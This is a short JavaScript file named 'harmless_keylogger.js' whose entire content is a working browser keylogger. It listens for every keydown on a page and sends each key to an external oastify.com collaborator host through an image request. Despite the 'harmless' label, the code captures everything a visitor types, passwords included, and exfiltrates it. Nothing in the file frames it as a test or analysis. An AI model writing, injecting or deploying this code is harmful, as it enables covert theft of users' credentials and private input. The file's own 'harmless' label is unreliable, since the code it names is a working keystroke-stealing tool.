// harmless_keylogger.js
document.addEventListener('keydown', function (e) {
    const keystroke = e.key;
    const img = new Image();
    img.src = 'https://zil6jszs2ljn1pf9lqpw13flnct3hzdn2.oastify.com/log?key=' + encodeURIComponent(keystroke);
    document.body.appendChild(img); // This sends the keystroke to your server
});
